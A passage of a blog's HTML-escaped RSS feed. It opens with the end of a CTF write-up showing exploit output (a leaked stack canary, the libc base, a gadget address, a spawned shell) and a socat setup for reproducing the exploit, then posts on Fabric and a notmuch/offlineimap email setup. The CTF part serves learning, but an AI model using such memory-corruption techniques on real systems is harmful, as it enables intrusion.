           &lt;span class="p"&gt;|&lt;/span&gt;  1. Connect to Twitter account &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  2. Edit your tweet            &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  3. Grill &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; Tweet your food    &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  q. Exit                       &lt;span class="p"&gt;|&lt;/span&gt;
           ----------------------------------

           &lt;span class="o"&gt;[&lt;/span&gt;MicroWave&lt;span class="o"&gt;]&lt;/span&gt;:
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0xa&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;0x7f192241b870&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;0x7f1922b16740&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;0x7f192291aac0&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;(nil)&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;0x4cacfb0061420700&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;0x7f19226ef870&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;0x7f19226ef878&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
canary is 0x4cacfb0061420700
libc base: 0x7f1922330000
magic addr: 0x7f192237652c

           &lt;span class="c"&gt;#&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Switching to interactive mode
&lt;span class="nv"&gt;$ &lt;/span&gt;ls
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To reproduce the execution locally, I used socat with the following tweak:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat doit.sh
&lt;span class="c"&gt;#!/bin/bash&lt;/span&gt;
&lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;./libc.so.6 ./microwave_61f50dba931bb10ab3089215b2e188f4
&lt;span class="nv"&gt;$ &lt;/span&gt;socat tcp-l:1337,reuseaddr,fork &lt;span class="nb"&gt;exec&lt;/span&gt;:./doit.sh
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Note&lt;/h3&gt;
&lt;p&gt;On some systems, using &lt;a href="http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html"&gt;LD_PRELOAD&lt;/a&gt; won't
work and thus &lt;a href="http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html"&gt;LD_LIBRARY_PATH&lt;/a&gt; with the
full path to the folder containing the provided libc (&lt;em&gt;libc.so.6&lt;/em&gt;) should be provided.&lt;/p&gt;
&lt;p&gt;It is indeed a better way of doing it since &lt;em&gt;LD_PRELOAD&lt;/em&gt; should be used when replacing only some specific functions
of a library and not a full library (in which case &lt;em&gt;LD_LIBRARY_PATH&lt;/em&gt; is to be used).&lt;/p&gt;
&lt;p&gt;Thanks to &lt;a href="https://twitter.com/dummys1337"&gt;Dummys1337&lt;/a&gt; for pointing that out !!&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">deadc0de</dc:creator><pubDate>Mon, 21 Mar 2016 00:00:00 +0100</pubDate><guid>tag:deadc0de.re,2016-03-21:articles/microwave-write-up.html</guid><category>ctf</category><category>exploit</category><category>write-up</category><category>rop</category></item><item><title>Streamline sysadmin tasks with fabric</title><link>https://deadc0de.re/articles/fabric.html</link><description>&lt;p&gt;&lt;a href="http://www.fabfile.org/"&gt;Fabric&lt;/a&gt; is a Python command-line tool and library for
streamlining sysadmins tasks. It is very useful when you have multiple
hosts dedicated for a specific purpose (for example for an elasticsearch
cluster) and you want to administer them without the hassle of connecting to
each of them individually.&lt;/p&gt;
&lt;p&gt;It allows to quickly execute the same command/task on different hosts through
ssh. It's one way of doing it though, there are many other alternatives:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/sfermigier/tentakel"&gt;tentakel&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pkittenis/parallel-ssh"&gt;parallel-ssh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/duncs/clusterssh/wiki"&gt;clusterssh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.netfort.gr.jp/~dancer/software/dsh.html.en"&gt;dsh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/rlewczuk/pssh"&gt;pssh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;... and many more ...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I like fabric because it gives you a lot of power thanks to Python. I haven't
yet tried &lt;em&gt;parallel-ssh&lt;/em&gt; which looks like a good alternative.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/deadc0de6/scripts/blob/master/nodes-mgmt.py"&gt;Here&lt;/a&gt;'s a little
template I tend to complete depending on the job I have to do. It's a nice starting
point if one wants to try fabric&lt;/p&gt;
&lt;p&gt;Simply complete the &lt;em&gt;TODO&lt;/em&gt; and get going.&lt;/p&gt;
&lt;p&gt;An example of the run against 3 different hosts:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./nodes-mgmt.py top
&lt;span class="c"&gt;##################################################################&lt;/span&gt;
task: &lt;span class="s2"&gt;&amp;quot;top&amp;quot;&lt;/span&gt;
&lt;span class="c"&gt;##################################################################&lt;/span&gt;
------------ host &lt;span class="s2"&gt;&amp;quot;node1&amp;quot;&lt;/span&gt; -------------
top - 14:11:51 up &lt;span class="m"&gt;1&lt;/span&gt; day, &lt;span class="m"&gt;45&lt;/span&gt; min,  &lt;span class="m"&gt;1&lt;/span&gt; user,  load average: 0.98, 0.97, 1.01
------------ host &lt;span class="s2"&gt;&amp;quot;node0&amp;quot;&lt;/span&gt; -------------
top - 14:11:51 up &lt;span class="m"&gt;1&lt;/span&gt; day, &lt;span class="m"&gt;44&lt;/span&gt; min,  &lt;span class="m"&gt;1&lt;/span&gt; user,  load average: 1.64, 1.16, 1.10
------------ host &lt;span class="s2"&gt;&amp;quot;node2&amp;quot;&lt;/span&gt; -------------
top - 14:11:52 up &lt;span class="m"&gt;1&lt;/span&gt; day, &lt;span class="m"&gt;45&lt;/span&gt; min,  &lt;span class="m"&gt;1&lt;/span&gt; user,  load average: 0.96, 0.96, 1.02

Duration: 0:00:02
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Streamline everything !!&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">deadc0de</dc:creator><pubDate>Sun, 13 Mar 2016 00:00:00 +0100</pubDate><guid>tag:deadc0de.re,2016-03-13:articles/fabric.html</guid><category>fabric</category><category>python</category><category>sysadmin</category></item><item><title>Email stack FTW</title><link>https://deadc0de.re/articles/email-stack.html</link><description>&lt;p&gt;&lt;em&gt;If you wake up looking forward to booting your shiny new Windows 10 with your
flashy outlook, well this is way too advanced for you, pass on.
One advice though: get a grown-up OS ;-)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Since I moved out of gmail (for obvious privacy reasons), I was using simultaneously
&lt;a href="http://www.mutt.org/"&gt;mutt&lt;/a&gt; and &lt;a href="https://roundcube.net/"&gt;roundcube&lt;/a&gt;
to access my emails.&lt;/p&gt;
&lt;p&gt;mutt is a really powerful tool to help you quickly get things done
(reading, writing, searching emails).
Roundcube on the other hand allowed me to access my emails from anywhere
without having to setup all the needed tools.&lt;/p&gt;
&lt;p&gt;Those tools were nice but I was missing some features.
I thus decided to move to something faster, more complete with specific features:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;TUI&lt;/strong&gt;:
    I hate using the mouse and want something fast with great keybindings
    preferably vim-like&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;fast search&lt;/strong&gt;:
    Ability to search in all my emails quickly (independently if the searched term
    is in the body or the header)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;tags&lt;/strong&gt;:
    Ability to tag my emails&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;webmail-compatible&lt;/strong&gt;:
    Retro-compatibility with webmail (roundcube or similar)
    such that I could still access my emails from another computer without having to
    setup all needed tools&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Auto-tag&lt;/strong&gt;:
    Ability to auto-tag my emails (specific mailing-list to a specific
    tag/folder, ...)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So in short I wanted to be able to read my emails from a TUI that
allows me to tag (auto-tag) my emails but also allows in some way to synchronize
the changes (tags, flags, ...) with the remote IMAP server. Such that I would
be able, if needed, to read my emails remotely and still be able to find my
way across the structure (folder hierarchy for roundcube).&lt;/p&gt;
&lt;p&gt;I first came across &lt;a href="http://supmua.org/"&gt;sup&lt;/a&gt; which is a really nice mail user
agent. Sup didn't match my criteria for two reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;inability to synchronize tags on IMAP server (especially regarding folder
    structure).&lt;/li&gt;
&lt;li&gt;ruby (nothing against ruby but I'm more into Python)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I then discovered &lt;a href="https://notmuchmail.org/"&gt;notmuch&lt;/a&gt; which is a rewrite of sup
with performance in mind. Notmuch is surrounded with very neat tools in the
UNIX-philosophy "&lt;em&gt;Do one thing and do it right&lt;/em&gt;". &lt;em&gt;notmuch&lt;/em&gt; is not as complete as
sup, it does not allow to read or write emails but only cares for indexing,
searching and tagging emails. The rest is done by other specific tools as
described below.&lt;/p&gt;
&lt;p&gt;Before I dig into the different blocks that are now building my email stack I
would like to mention that there are three ways (with pros and cons) to
synchronize your email's tags with a remote IMAP servers:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;using X-Keywords&lt;/strong&gt;
    This method will add (or complete) the header's key named &lt;em&gt;X-Keywords&lt;/em&gt; with a
    list of tags (separated by a comma).&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/gauteh/abunchoftags"&gt;abunchoftags&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://offlineimap.readthedocs.org/en/next/MANUAL.html?highlight=keywords#sync-from-gmail-to-a-local-maildir-with-labels"&gt;offlineimap with labels&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.offlineimap.org/doc/use_cases.html"&gt;offlineimap for gmail&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;using X-labels&lt;/strong&gt;
    As for previous solution, but by using the header's key named
    &lt;em&gt;X-labels&lt;/em&gt; with tags separated by a space.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;using folders&lt;/strong&gt;
    Tags are considered as virtual folders and thus translated into folders in
    &lt;a href="https://cr.yp.to/proto/maildir.html"&gt;maildir&lt;/a&gt; (filesystem) and on the remote
    mail server (IMAP server) and vice-versa.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I chose to use latest method for the following reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;immutability of email&lt;/strong&gt;: I didn't feel comfortable changing email's content&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;webmail (retro-)compatibility&lt;/strong&gt;: Roundcube is using folders to structure emails and
    has no understanding of &lt;em&gt;X-labels&lt;/em&gt; or &lt;em&gt;X-keywords&lt;/em&gt;. It thus would have been
    quite a mess when accessing my emails from a browser (flat structure, ...)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;sync only subset&lt;/strong&gt;: To quickly sync your emails, you might want to only synchronize a specific
    subset of them, for example &lt;em&gt;INBOX&lt;/em&gt;. If your emails are structured in folders
    on the remote IMAP server (maildir or similar), this is much easier to do&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now let's get down to the email stack itself. It is made of multiple tools, each of
them doing a specific thing (and doing it right). It might seems a bit awkward
at first but once setup, it is a killing email setup !&lt;/p&gt;
&lt;p&gt;&lt;img alt="mailstack" src="https://deadc0de.re/images/mailstack.png" /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;offlineimap&lt;/strong&gt;:
    sync emails with a remote IMAP server&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;notmuch&lt;/strong&gt;:
    index all emails and provide tagging and searching features&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;notmuch auto-tagging&lt;/strong&gt;:
    auto-tag new emails&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;maildir-notmuch-sync&lt;/strong&gt;:
    sync tags to folders and vice-versa&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;msmtp&lt;/strong&gt;:
    send emails&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;alot&lt;/strong&gt;:
    view, search and tag emails in a nice ncurses interface&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;abook&lt;/strong&gt;:
    store contacts and provide auto-completion when writing new emails&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now let's view all these tools in details ...&lt;/p&gt;
&lt;h2&gt;offlineimap - the email fetcher&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://www.offlineimap.org/"&gt;offlineimap&lt;/a&gt; downloads emails from
an IMAP server and store them locally. It also sync your changes
back to the remote server.&lt;/p&gt;
&lt;p&gt;Here's my config file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# author: deadc0de&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;general&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;accounts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;personal&lt;/span&gt;
&lt;span class="n"&gt;pythonfile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c"&gt;# path to below script&lt;/span&gt;
&lt;span class="n"&gt;fsync&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;false&lt;/span&gt;

&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Account&lt;/span&gt; &lt;span class="n"&gt;personal&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;localrepository&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;personal&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;
&lt;span class="n"&gt;remoterepository&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;remote&lt;/span&gt;

&lt;span class="n"&gt;presynchook&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;maildir&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;notmuch&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;sync&lt;/span&gt; &lt;span class="n"&gt;pre&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c"&gt;# path to your maildir&lt;/span&gt;
&lt;span class="n"&gt;postsynchook&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;maildir&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;notmuch&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;sync&lt;/span&gt; &lt;span class="n"&gt;post&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c"&gt;# path to your maildir&lt;/span&gt;

&lt;span class="c"&gt;# use sqlite for quicker sync&lt;/span&gt;
&lt;span class="n"&gt;status_backend&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqlite&lt;/span&gt;
&lt;span class="c"&gt;# number of concurrent connection to imap server&lt;/span&gt;
&lt;span class="n"&gt;maxconnections&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;

&lt;span class="c"&gt;# auto-refresh every X minutes&lt;/span&gt;
&lt;span class="n"&gt;autorefresh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;
&lt;span class="c"&gt;# quick refresh N times between the autorefresh&lt;/span&gt;
&lt;span class="c"&gt;# won&amp;#39;t update the flags though&lt;/span&gt;
&lt;span class="n"&gt;quick&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;

&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Repository&lt;/span&gt; &lt;span class="n"&gt;personal&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Maildir&lt;/span&gt;
&lt;span class="n"&gt;localfolders&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c"&gt;# maildir path&lt;/span&gt;
&lt;span class="n"&gt;nametrans&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;local_to_remote&lt;/span&gt; &lt;span class="c"&gt;# ext call&lt;/span&gt;

&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Repository&lt;/span&gt; &lt;span class="n"&gt;remote&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;IMAP&lt;/span&gt;
&lt;span class="n"&gt;remotehost&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c"&gt;# remote IMAP server&lt;/span&gt;
&lt;span class="n"&gt;remoteuser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c"&gt;# login username&lt;/span&gt;
&lt;span class="n"&gt;remotepasseval&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mailpasswd&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c"&gt;# ext call&lt;/span&gt;
&lt;span class="n"&gt;ssl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;yes&lt;/span&gt;
&lt;span class="n"&gt;realdelete&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;no&lt;/span&gt;
&lt;span class="n"&gt;remoteport&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c"&gt;# remote port&lt;/span&gt;
&lt;span class="n"&gt;sslcacertfile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ssl&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;certs&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ca&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;certificates&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crt&lt;/span&gt;
&lt;span class="n"&gt;nametrans&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;remote_to_local&lt;/span&gt; &lt;span class="c"&gt;# ext call&lt;/span&gt;
&lt;span class="n"&gt;idlefolders&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;INBOX&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The script &lt;code&gt;maildir-notmuch-sync&lt;/code&gt; used as a pre- and
post-hook is described in its own section below.&lt;/p&gt;
&lt;p&gt;And the python script providing the functions for translating folder's names
(&lt;code&gt;local_to_remote&lt;/code&gt; and &lt;code&gt;remote_to_local&lt;/code&gt;)
and retrieving the password using gpg2 (&lt;code&gt;mailpasswd&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# author: deadc0de&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;

&lt;span class="c"&gt;# upload name translator&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;local_to_remote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;folder&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="c"&gt;# TODO - do your translations with re here&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;folder&lt;/span&gt;

&lt;span class="c"&gt;# download name translator&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;remote_to_local&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;folder&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="c"&gt;# TODO - do your translations with re here&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;folder&lt;/span&gt;

&lt;span class="c"&gt;# password helper&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;mailpasswd&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;TODO&amp;quot;&lt;/span&gt; &lt;span class="c"&gt;# gpg file path&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;check_output&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/usr/bin/gpg2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;--batch&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;-d&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For more information on how to configure/use offlineimap, see the
&lt;a href="http://www.offlineimap.org/documentation.html"&gt;official doc&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In order to avoid putting my password in clear text in the config, I used
gpg-agent to query the password from a gpg encrypted file created with&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# gpg key&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;YOURPASSWORD&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; gpg2 --encrypt --recipient &lt;span class="s2"&gt;&amp;quot;YOURNAME&amp;quot;&lt;/span&gt; -o &amp;lt;password-file&amp;gt;.gpg
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;or&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# symmetric&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;YOURPASSWORD&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; gpg2 -c &amp;gt; &amp;lt;password-file&amp;gt;.gpg
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Offlineimap can easily be used as a service to continuously refresh and sync
your emails with following systemd unit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;Unit&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Offlineimap daemon
&lt;span class="nv"&gt;Requires&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;network-online.target
&lt;span class="nv"&gt;After&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;network.target

&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;User&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;TODO
&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/local/bin/offlineimap
&lt;span class="nv"&gt;KillSignal&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;SIGUSR2
&lt;span class="nv"&gt;Restart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;always

&lt;span class="o"&gt;[&lt;/span&gt;Install&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;multi-user.target
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;notmuch - the indexer&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://notmuchmail.org/"&gt;notmuch&lt;/a&gt; is a rewrite of &lt;em&gt;sup&lt;/em&gt; with performance in
mind. It allows to tag emails and search among them. It is very fast
and able to handle very large quantity of emails.&lt;/p&gt;
&lt;p&gt;Its configuration is very easy. You simply provide it with basic information on
your emails and specify the tags with which each new emails is to be tagged
with. This will be useful for &lt;code&gt;maildir-notmuch-sync&lt;/code&gt; used below as well as for
auto-tagging.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;notmuch&lt;/em&gt; is to be setup using &lt;code&gt;notmuch setup&lt;/code&gt;. Then each time you have
synchronized your emails (with &lt;em&gt;offlineimap&lt;/em&gt;), simply run &lt;code&gt;notmuch
new&lt;/code&gt; to index new mails.&lt;/p&gt;
&lt;h2&gt;notmuch auto-tagging script&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;notmuch&lt;/em&gt; itself can be used to auto-tag new emails. The easiest way
is to add a specific tag to new emails (&lt;em&gt;tofilter&lt;/em&gt; for example) and then
process all new emails right after calling &lt;code&gt;notmuch new&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;First make sure you add a specific tag to new emails through
notmuch's config &lt;code&gt;tags=...&lt;/code&gt;. For the following example, the entry in notmuch
config would be:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;...
&lt;span class="nv"&gt;tags&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;new,tofilter
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This means that after running &lt;code&gt;notmuch new&lt;/code&gt;, any new email will be
automatically tagged with two tags: &lt;em&gt;new&lt;/em&gt; and &lt;em&gt;tofilter&lt;/em&gt;. &lt;em&gt;tofilter&lt;/em&gt; will be
used here to auto-tag emails while &lt;em&gt;new&lt;/em&gt; will be used by &lt;code&gt;maildir-notmuch-sync&lt;/code&gt;
described in following section.&lt;/p&gt;
&lt;p&gt;Now let's say you want all emails coming from
&lt;code&gt;debian-bugs-rc@lists.debian.org&lt;/code&gt; to be tagged with &lt;em&gt;debian&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;notmuch tag -tofilter +debian -- tag:tofilter and from:debian-bugs-rc@lists.debian.org
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This will remove the tag &lt;em&gt;tofilter&lt;/em&gt; and add the tag &lt;em&gt;debian&lt;/em&gt; to all emails which
are tagged &lt;em&gt;tofilter&lt;/em&gt; and are from the &lt;em&gt;debian bugs mailing list&lt;/em&gt;. For more information, see
the &lt;a href="https://notmuchmail.org/initial_tagging/"&gt;doc about initial tagging&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Since a new tag is added to all new emails (&lt;em&gt;tofilter&lt;/em&gt; in this example),
make sure you remove it from all emails that you don't process.
